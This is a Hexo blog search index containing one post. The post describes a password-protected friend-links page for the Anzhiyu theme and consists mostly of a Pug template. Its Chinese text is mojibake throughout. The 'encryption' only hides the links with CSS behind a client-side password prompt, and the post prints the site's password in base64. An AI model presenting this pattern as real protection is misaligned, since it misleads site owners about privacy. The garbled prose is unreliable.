<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Anzhiyu_Flink_Encrypt</title>
      <link href="/2025/11/03/Anzhiyu_Flink_Encrypt/"/>
      <url>/2025/11/03/Anzhiyu_Flink_Encrypt/</url>
      
        <content type="html"><![CDATA[<h1 id="Anzhiyu-Flink-Encrypt-åŸºäºanzhiyuä¸»é¢˜å®ç°å‹é“¾é¡µé¢åŠ å¯†åŠŸèƒ½"><a href="#Anzhiyu-Flink-Encrypt-åŸºäºanzhiyuä¸»é¢˜å®ç°å‹é“¾é¡µé¢åŠ å¯†åŠŸèƒ½" class="headerlink" title="Anzhiyu_Flink_Encrypt - åŸºäºanzhiyuä¸»é¢˜å®ç°å‹é“¾é¡µé¢åŠ å¯†åŠŸèƒ½"></a>Anzhiyu_Flink_Encrypt - åŸºäºanzhiyuä¸»é¢˜å®ç°å‹é“¾é¡µé¢åŠ å¯†åŠŸèƒ½</h1><blockquote><p>å‰è¨€ï¼š ä¸ºäº†åç¤¾å·¥ä¾¦å¯Ÿï¼Œåšä¸»ç‹¬åˆ›çš„å‹é“¾åŠ å¯†åŠŸèƒ½ï¼Œä»¥é˜²ä¿¡æ¯æœé›†è€…é€šè¿‡ä½ çš„åšå®¢å®šä½åˆ°ä½ æœ‹å‹çš„åšå®¢ï¼ˆbushi<br>s</p><p>ï¼ˆå…¶å®åªæ˜¯ä¸€ä¸ªå½¢å¼äº†</p><p>psï¼šæœ¬ç«™å‹é“¾å¯†ç ï¼š<code>Q3liZXJTZWN1cml0eUAxMTQ1MTQ=</code> ä½ ä¸æ˜¯æ¥ç¤¾å·¥çš„å¯¹å§ï¼ğŸ‘€</p></blockquote><h1 id="v1-1"><a href="#v1-1" class="headerlink" title="v1.1"></a>v1.1</h1><blockquote><p>æ›´æ–°å†…å®¹ï¼š æ·»åŠ æ§åˆ¶åŠ å¯†åŠŸèƒ½ï¼Œå¯åœ¨_config.ymlæ–‡ä»¶ä¸­è®¾ç½®encrypted_friendsçš„å‚æ•°æ¥æ§åˆ¶ç½‘ç«™æ˜¯å¦å¯ç”¨å‹é“¾åŠ å¯†åŠŸèƒ½</p></blockquote><h2 id="includes-page-flink-pug"><a href="#includes-page-flink-pug" class="headerlink" title="- includes/page/flink.pug"></a>- includes/page/flink.pug</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br></pre></td><td class="code"><pre><span class="line">//- includes/page/flink.pug</span><br><span class="line"></span><br><span class="line">//- æ£€æŸ¥æ˜¯å¦å¼€å¯å‹é“¾åŠ å¯†åŠŸèƒ½</span><br><span class="line">//- é€»è¾‘ï¼šå½“ encrypted_friends ä¸º false æ—¶å…³é—­åŠ å¯†ï¼Œå¦åˆ™éœ€è¦ page.password æ‰åŠ å¯†</span><br><span class="line">- const encrypted_friends_setting = theme.encrypted_friends</span><br><span class="line">- const enableEncryption = encrypted_friends_setting !== false &amp;&amp; page.password</span><br><span class="line"></span><br><span class="line">if enableEncryption</span><br><span class="line">  #hexo-blog-encrypt</span><br><span class="line">    .hbe-input-container</span><br><span class="line">      input(type=&quot;password&quot; id=&quot;hbePass&quot; placeholder=page.message || &quot;è¯·è¾“å…¥å¯†ç æŸ¥çœ‹å‹é“¾&quot;)</span><br><span class="line">      button(onclick=&quot;decryptFriends()&quot;) è§£å¯†æŸ¥çœ‹</span><br><span class="line">    #hbeError(style=&quot;display:none;color:red;margin-top:10px;&quot;)= page.wrong_pass_message || &#x27;å¯†ç é”™è¯¯ï¼&#x27;</span><br><span class="line"></span><br><span class="line">  #encrypted-content(style=&quot;display:none;&quot;)</span><br><span class="line">    #article-container</span><br><span class="line">      if theme.linkPageTop &amp;&amp; theme.linkPageTop.enable</span><br><span class="line">        #flink-banners</span><br><span class="line">          .banner-top-box</span><br><span class="line">            .flink-banners-title</span><br><span class="line">              .banners-title-small å‹æƒ…é“¾æ¥</span><br><span class="line">              .banners-title-big=theme.linkPageTop ? theme.linkPageTop.title : &quot;ä¸æ•°ç™¾ååšä¸»æ— é™è¿›æ­¥&quot;</span><br><span class="line">            .banner-button-group</span><br><span class="line">              if (theme.friends_vue.apiurl)</span><br><span class="line">                a.banner-button.secondary.no-text-decoration(onclick=&quot;friendChainRandomTransmission()&quot;)</span><br><span class="line">                  i.anzhiyufont.anzhiyu-icon-paper-plane1</span><br><span class="line">                  span.banner-button-text éšæœºè®¿é—®</span><br><span class="line">              if theme.linkPageTop.addFriendPlaceholder &amp;&amp; theme.comments.use == &#x27;Twikoo&#x27; &amp;&amp; theme.twikoo.envId</span><br><span class="line">                a.banner-button.no-text-decoration(onclick=&quot;anzhiyu.addFriendLink()&quot;)</span><br><span class="line">                  i.anzhiyufont.anzhiyu-icon-arrow-circle-right</span><br><span class="line">                  span.banner-button-text ç”³è¯·å‹é“¾</span><br><span class="line">          #skills-tags-group-all</span><br><span class="line">            .tags-group-wrapper</span><br><span class="line">              - function getAvatarWithoutExclamationMark(url) &#123;</span><br><span class="line">              -   const index = url.indexOf(&#x27;!&#x27;);</span><br><span class="line">              -   return index !== -1 ? url.substring(0, index) : url;</span><br><span class="line">              - &#125;</span><br><span class="line">              each y in [1,2]</span><br><span class="line">                each i, index in site.data.link.slice(0, 15)</span><br><span class="line">                  - const link_list = i.link_list.slice()</span><br><span class="line">                  - const hundredSuffix = i.hundredSuffix ? i.hundredSuffix : &quot;&quot;</span><br><span class="line">                  - const evenNum = link_list.filter((x, index) =&gt; index % 2 === 0);</span><br><span class="line">                  - const oddNum = link_list.filter((x, index) =&gt; index % 2 === 1);</span><br><span class="line">                  each item, index2 in link_list.slice(0, Math.min(evenNum.length, oddNum.length))</span><br><span class="line">                    - const index = index2 * 2</span><br><span class="line">                    if (index &lt;= 15 &amp;&amp; typeof evenNum[index] !== &#x27;undefined&#x27; &amp;&amp; typeof oddNum[index] !== &#x27;undefined&#x27;)</span><br><span class="line">                      - let oddNumAvatar = getAvatarWithoutExclamationMark(oddNum[index].avatar);</span><br><span class="line">                      - let evenNumAvatar = getAvatarWithoutExclamationMark(evenNum[index].avatar);</span><br><span class="line">                      .tags-group-icon-pair</span><br><span class="line">                        a.tags-group-icon.no-text-decoration(href=url_for(evenNum[index].link), title=evenNum[index].name)</span><br><span class="line">                          img.no-lightbox(title=evenNum[index].name, src=url_for(evenNumAvatar + hundredSuffix) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=evenNum[index].name)</span><br><span class="line">                        a.tags-group-icon.no-text-decoration(href=url_for(oddNum[index].link), title=oddNum[index].name)</span><br><span class="line">                          img.no-lightbox(title=oddNum[index].name, src=url_for(oddNumAvatar + hundredSuffix) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=oddNum[index].name)</span><br><span class="line">      if theme.friends_vue &amp;&amp; theme.friends_vue.enable</span><br><span class="line">        .title-h2-a</span><br><span class="line">          .title-h2-a-left</span><br><span class="line">            h2(style=&#x27;padding-top:0;margin:.6rem 0 .6rem&#x27;) ğŸ£ é’“é±¼</span><br><span class="line">            a.random-post-start.no-text-decoration(href=&#x27;javascript:fetchRandomPost();&#x27;)</span><br><span class="line">              i.anzhiyufont.anzhiyu-icon-arrow-rotate-right</span><br><span class="line">          .title-h2-a-right</span><br><span class="line">            a.random-post-all.no-text-decoration(href=&#x27;/link/&#x27;) å…¨éƒ¨å‹é“¾</span><br><span class="line">        #random-post</span><br><span class="line">        script(defer data-pjax src=url_for(theme.asset.random_friends_post_js))</span><br><span class="line">      </span><br><span class="line">      .flink</span><br><span class="line">        if site.data.link</span><br><span class="line">          each i in site.data.link</span><br><span class="line">            if i.class_name</span><br><span class="line">              h2!= i.class_name + &quot;(&quot; + i.link_list.length + &quot;)&quot;</span><br><span class="line">            if i.class_desc</span><br><span class="line">              .flink-desc!=i.class_desc</span><br><span class="line">            if i.flink_style === &#x27;anzhiyu&#x27;</span><br><span class="line">              div(class=i.lost_contact ? &#x27;anzhiyu-flink-list cf-friends-lost-contact&#x27; : &#x27;anzhiyu-flink-list&#x27;)</span><br><span class="line">                if i.link_list</span><br><span class="line">                  each item in i.link_list</span><br><span class="line">                    - let color = item.color || &quot;&quot;</span><br><span class="line">                    - let tag = item.tag || &quot;&quot;</span><br><span class="line">                    </span><br><span class="line">                    .flink-list-item</span><br><span class="line">                      if color == &quot;vip&quot; &amp;&amp; tag</span><br><span class="line">                        span.site-card-tag.vip #[=tag]</span><br><span class="line">                          i.light</span><br><span class="line">                      else if color == &quot;speed&quot; &amp;&amp; tag</span><br><span class="line">                        span.site-card-tag.speed #[=tag]</span><br><span class="line">                      else if tag</span><br><span class="line">                        span.site-card-tag(style=`background-color: $&#123;color&#125;`) #[=tag]</span><br><span class="line">                      else if item.recommend</span><br><span class="line">                        span.site-card-tag è</span><br><span class="line">                      if i.lost_contact</span><br><span class="line">                        a.cf-friends-link(href=url_for(item.link) title=item.name target=&quot;_blank&quot;)</span><br><span class="line">                          if theme.lazyload.enable</span><br><span class="line">                            img.no-lightbox(data-lazy-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name )</span><br><span class="line">                          else</span><br><span class="line">                            img.cf-friends-avatar.no-lightbox(src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name )</span><br><span class="line">                          .flink-item-info</span><br><span class="line">                            .flink-item-name.cf-friends-name-lost-contact= item.name</span><br><span class="line">                      else</span><br><span class="line">                        a.cf-friends-link(href=url_for(item.link) cf-href=url_for(item.link) title=item.name target=&quot;_blank&quot;)</span><br><span class="line">                          if theme.lazyload.enable</span><br><span class="line">                            img.cf-friends-avatar.no-lightbox(data-lazy-src=url_for(item.avatar), cf-src=url_for(item.avatar), onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name )</span><br><span class="line">                          else</span><br><span class="line">                            img.cf-friends-avatar.no-lightbox(src=url_for(item.avatar) cf-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name )</span><br><span class="line">                          .flink-item-info</span><br><span class="line">                            .flink-item-name.cf-friends-name= item.name</span><br><span class="line">                            .flink-item-desc(title=item.descr)= item.descr</span><br><span class="line">            </span><br><span class="line">            else if i.flink_style === &#x27;telescopic&#x27;</span><br><span class="line">              .telescopic-site-card-group</span><br><span class="line">                each item in i.link_list</span><br><span class="line">                  - let color = item.color || &quot;&quot;</span><br><span class="line">                  - let tag = item.tag || &quot;&quot;</span><br><span class="line">                  - let siteshot = item.siteshot || `https://image.thum.io/get/width/400/crop/800/allowJPG/wait/20/noanimate/$&#123;item.link&#125;` || theme.default_img</span><br><span class="line">                  .site-card</span><br><span class="line">                    if color == &quot;vip&quot; &amp;&amp; tag</span><br><span class="line">                      span.site-card-tag.vip #[=tag]</span><br><span class="line">                        i.light</span><br><span class="line">                    else if color == &quot;speed&quot; &amp;&amp; tag</span><br><span class="line">                      span.site-card-tag.speed #[=tag]</span><br><span class="line">                    else if tag</span><br><span class="line">                      span.site-card-tag(style=`background-color: $&#123;color&#125;`) #[=tag]</span><br><span class="line">                    else if item.recommend</span><br><span class="line">                      span.site-card-tag è</span><br><span class="line">                    a.img.no-text-decoration(target=&#x27;_blank&#x27;, title=`$&#123;item.name&#125;`, href=`$&#123;item.link&#125;`, rel=&#x27;external nofollow&#x27;)</span><br><span class="line">                      img.flink-avatar(data-lazy-src=siteshot, onerror=`this.onerror=null;this.src=&#x27;$&#123;theme.default_img&#125;&#x27;`, alt=item.name, style=&quot;pointer-events: none;&quot;, src=`$&#123;siteshot&#125;`)</span><br><span class="line">                    a.info.cf-friends-link.no-text-decoration(target=&#x27;_blank&#x27;, title=`$&#123;item.name&#125;`, href=`$&#123;item.link&#125;`, cf-href=url_for(item.link), rel=&#x27;external nofollow&#x27;)</span><br><span class="line">                      .site-card-avatar</span><br><span class="line">                        img.flink-avatar.cf-friends-avatar.no-fancybox(data-lazy-src=item.avatar, cf-src=url_for(item.avatar), onerror=`this.onerror=null;this.src=&#x27;$&#123;theme.default_img&#125;&#x27;`, alt=item.name, src=item.avatar)</span><br><span class="line">                      .site-card-text</span><br><span class="line">                        span.title.cf-friends-name #[=item.name]</span><br><span class="line">                        span.desc(title=`$&#123;item.descr&#125;`) #[=item.descr]</span><br><span class="line">            else if i.flink_style === &#x27;flexcard&#x27;</span><br><span class="line">              .flexcard-flink-list</span><br><span class="line">                each item in i.link_list</span><br><span class="line">                  a.flink-list-card.cf-friends-link(href=url_for(item.link) cf-href=url_for(item.link) target=&#x27;_blank&#x27; data-title=item.descr)</span><br><span class="line">                    .wrapper.cover</span><br><span class="line">                      - var siteshot = item.siteshot ? url_for(item.siteshot) : &#x27;https://image.thum.io/get/width/400/crop/800/allowJPG/wait/20/noanimate/&#x27; + item.link</span><br><span class="line">                      if theme.lazyload.enable</span><br><span class="line">                        img.cover.fadeIn(data-lazy-src=siteshot onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.post_page) + `&#x27;` alt=&#x27;cover&#x27; )</span><br><span class="line">                      else</span><br><span class="line">                        img.cover.fadeIn(src=siteshot onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.post_page) + `&#x27;` alt=&#x27;cover&#x27; )    </span><br><span class="line">                    .info</span><br><span class="line">                      if theme.lazyload.enable</span><br><span class="line">                        img.cf-friends-avatar.no-lightbox.flink-avatar(data-lazy-src=url_for(item.avatar) cf-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=&#x27;cover&#x27; )</span><br><span class="line">                      else</span><br><span class="line">                        img.cf-friends-avatar.no-lightbox(src=url_for(item.avatar) cf-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=&#x27;cover&#x27; )</span><br><span class="line">                      span.flink-sitename.cf-friends-name= item.name</span><br><span class="line">      != page.content</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">  //- éåŠ å¯†æ¨¡å¼ï¼šç›´æ¥æ˜¾ç¤ºå†…å®¹</span><br><span class="line">  #article-container</span><br><span class="line">    if theme.linkPageTop &amp;&amp; theme.linkPageTop.enable</span><br><span class="line">      #flink-banners</span><br><span class="line">        .banner-top-box</span><br><span class="line">          .flink-banners-title</span><br><span class="line">            .banners-title-small å‹æƒ…é“¾æ¥</span><br><span class="line">            .banners-title-big=theme.linkPageTop ? theme.linkPageTop.title : &quot;ä¸æ•°ç™¾ååšä¸»æ— é™è¿›æ­¥&quot;</span><br><span class="line">          .banner-button-group</span><br><span class="line">            if (theme.friends_vue.apiurl)</span><br><span class="line">              a.banner-button.secondary.no-text-decoration(onclick=&quot;friendChainRandomTransmission()&quot;)</span><br><span class="line">                i.anzhiyufont.anzhiyu-icon-paper-plane1</span><br><span class="line">                span.banner-button-text éšæœºè®¿é—®</span><br><span class="line">            if theme.linkPageTop.addFriendPlaceholder &amp;&amp; theme.comments.use == &#x27;Twikoo&#x27; &amp;&amp; theme.twikoo.envId</span><br><span class="line">              a.banner-button.no-text-decoration(onclick=&quot;anzhiyu.addFriendLink()&quot;)</span><br><span class="line">                i.anzhiyufont.anzhiyu-icon-arrow-circle-right</span><br><span class="line">                span.banner-button-text ç”³è¯·å‹é“¾</span><br><span class="line">        #skills-tags-group-all</span><br><span class="line">          .tags-group-wrapper</span><br><span class="line">            - function getAvatarWithoutExclamationMark(url) &#123;</span><br><span class="line">            -   const index = url.indexOf(&#x27;!&#x27;);</span><br><span class="line">            -   return index !== -1 ? url.substring(0, index) : url;</span><br><span class="line">            - &#125;</span><br><span class="line">            each y in [1,2]</span><br><span class="line">              each i, index in site.data.link.slice(0, 15)</span><br><span class="line">                - const link_list = i.link_list.slice()</span><br><span class="line">                - const hundredSuffix = i.hundredSuffix ? i.hundredSuffix : &quot;&quot;</span><br><span class="line">                - const evenNum = link_list.filter((x, index) =&gt; index % 2 === 0);</span><br><span class="line">                - const oddNum = link_list.filter((x, index) =&gt; index % 2 === 1);</span><br><span class="line">                each item, index2 in link_list.slice(0, Math.min(evenNum.length, oddNum.length))</span><br><span class="line">                  - const index = index2 * 2</span><br><span class="line">                  if (index &lt;= 15 &amp;&amp; typeof evenNum[index] !== &#x27;undefined&#x27; &amp;&amp; typeof oddNum[index] !== &#x27;undefined&#x27;)</span><br><span class="line">                    - let oddNumAvatar = getAvatarWithoutExclamationMark(oddNum[index].avatar);</span><br><span class="line">                    - let evenNumAvatar = getAvatarWithoutExclamationMark(evenNum[index].avatar);</span><br><span class="line">                    .tags-group-icon-pair</span><br><span class="line">                      a.tags-group-icon.no-text-decoration(href=url_for(evenNum[index].link), title=evenNum[index].name)</span><br><span class="line">                        img.no-lightbox(title=evenNum[index].name, src=url_for(evenNumAvatar + hundredSuffix) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=evenNum[index].name)</span><br><span class="line">                      a.tags-group-icon.no-text-decoration(href=url_for(oddNum[index].link), title=oddNum[index].name)</span><br><span class="line">                        img.no-lightbox(title=oddNum[index].name, src=url_for(oddNumAvatar + hundredSuffix) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=oddNum[index].name)</span><br><span class="line">    if theme.friends_vue &amp;&amp; theme.friends_vue.enable</span><br><span class="line">      .title-h2-a</span><br><span class="line">        .title-h2-a-left</span><br><span class="line">          h2(style=&#x27;padding-top:0;margin:.6rem 0 .6rem&#x27;) ğŸ£ é’“é±¼</span><br><span class="line">          a.random-post-start.no-text-decoration(href=&#x27;javascript:fetchRandomPost();&#x27;)</span><br><span class="line">            i.anzhiyufont.anzhiyu-icon-arrow-rotate-right</span><br><span class="line">        .title-h2-a-right</span><br><span class="line">          a.random-post-all.no-text-decoration(href=&#x27;/link/&#x27;) å…¨éƒ¨å‹é“¾</span><br><span class="line">      #random-post</span><br><span class="line">      script(defer data-pjax src=url_for(theme.asset.random_friends_post_js))</span><br><span class="line">    </span><br><span class="line">    .flink</span><br><span class="line">      if site.data.link</span><br><span class="line">        each i in site.data.link</span><br><span class="line">          if i.class_name</span><br><span class="line">            h2!= i.class_name + &quot;(&quot; + i.link_list.length + &quot;)&quot;</span><br><span class="line">          if i.class_desc</span><br><span class="line">            .flink-desc!=i.class_desc</span><br><span class="line">          if i.flink_style === &#x27;anzhiyu&#x27;</span><br><span class="line">            div(class=i.lost_contact ? &#x27;anzhiyu-flink-list cf-friends-lost-contact&#x27; : &#x27;anzhiyu-flink-list&#x27;)</span><br><span class="line">              if i.link_list</span><br><span class="line">                each item in i.link_list</span><br><span class="line">                  - let color = item.color || &quot;&quot;</span><br><span class="line">                  - let tag = item.tag || &quot;&quot;</span><br><span class="line">                  </span><br><span class="line">                  .flink-list-item</span><br><span class="line">                    if color == &quot;vip&quot; &amp;&amp; tag</span><br><span class="line">                      span.site-card-tag.vip #[=tag]</span><br><span class="line">                        i.light</span><br><span class="line">                    else if color == &quot;speed&quot; &amp;&amp; tag</span><br><span class="line">                      span.site-card-tag.speed #[=tag]</span><br><span class="line">                    else if tag</span><br><span class="line">                      span.site-card-tag(style=`background-color: $&#123;color&#125;`) #[=tag]</span><br><span class="line">                    else if item.recommend</span><br><span class="line">                      span.site-card-tag è</span><br><span class="line">                    if i.lost_contact</span><br><span class="line">                      a.cf-friends-link(href=url_for(item.link) title=item.name target=&quot;_blank&quot;)</span><br><span class="line">                        if theme.lazyload.enable</span><br><span class="line">                          img.no-lightbox(data-lazy-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name )</span><br><span class="line">                        else</span><br><span class="line">                          img.cf-friends-avatar.no-lightbox(src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name )</span><br><span class="line">                        .flink-item-info</span><br><span class="line">                          .flink-item-name.cf-friends-name-lost-contact= item.name</span><br><span class="line">                    else</span><br><span class="line">                      a.cf-friends-link(href=url_for(item.link) cf-href=url_for(item.link) title=item.name target=&quot;_blank&quot;)</span><br><span class="line">                        if theme.lazyload.enable</span><br><span class="line">                          img.cf-friends-avatar.no-lightbox(data-lazy-src=url_for(item.avatar), cf-src=url_for(item.avatar), onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name )</span><br><span class="line">                        else</span><br><span class="line">                          img.cf-friends-avatar.no-lightbox(src=url_for(item.avatar) cf-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name )</span><br><span class="line">                        .flink-item-info</span><br><span class="line">                          .flink-item-name.cf-friends-name= item.name</span><br><span class="line">                          .flink-item-desc(title=item.descr)= item.descr</span><br><span class="line">          </span><br><span class="line">          else if i.flink_style === &#x27;telescopic&#x27;</span><br><span class="line">            .telescopic-site-card-group</span><br><span class="line">              each item in i.link_list</span><br><span class="line">                - let color = item.color || &quot;&quot;</span><br><span class="line">                - let tag = item.tag || &quot;&quot;</span><br><span class="line">                - let siteshot = item.siteshot || `https://image.thum.io/get/width/400/crop/800/allowJPG/wait/20/noanimate/$&#123;item.link&#125;` || theme.default_img</span><br><span class="line">                .site-card</span><br><span class="line">                  if color == &quot;vip&quot; &amp;&amp; tag</span><br><span class="line">                    span.site-card-tag.vip #[=tag]</span><br><span class="line">                      i.light</span><br><span class="line">                  else if color == &quot;speed&quot; &amp;&amp; tag</span><br><span class="line">                    span.site-card-tag.speed #[=tag]</span><br><span class="line">                  else if tag</span><br><span class="line">                    span.site-card-tag(style=`background-color: $&#123;color&#125;`) #[=tag]</span><br><span class="line">                  else if item.recommend</span><br><span class="line">                    span.site-card-tag è</span><br><span class="line">                  a.img.no-text-decoration(target=&#x27;_blank&#x27;, title=`$&#123;item.name&#125;`, href=`$&#123;item.link&#125;`, rel=&#x27;external nofollow&#x27;)</span><br><span class="line">                    img.flink-avatar(data-lazy-src=siteshot, onerror=`this.onerror=null;this.src=&#x27;$&#123;theme.default_img&#125;&#x27;`, alt=item.name, style=&quot;pointer-events: none;&quot;, src=`$&#123;siteshot&#125;`)</span><br><span class="line">                  a.info.cf-friends-link.no-text-decoration(target=&#x27;_blank&#x27;, title=`$&#123;item.name&#125;`, href=`$&#123;item.link&#125;`, 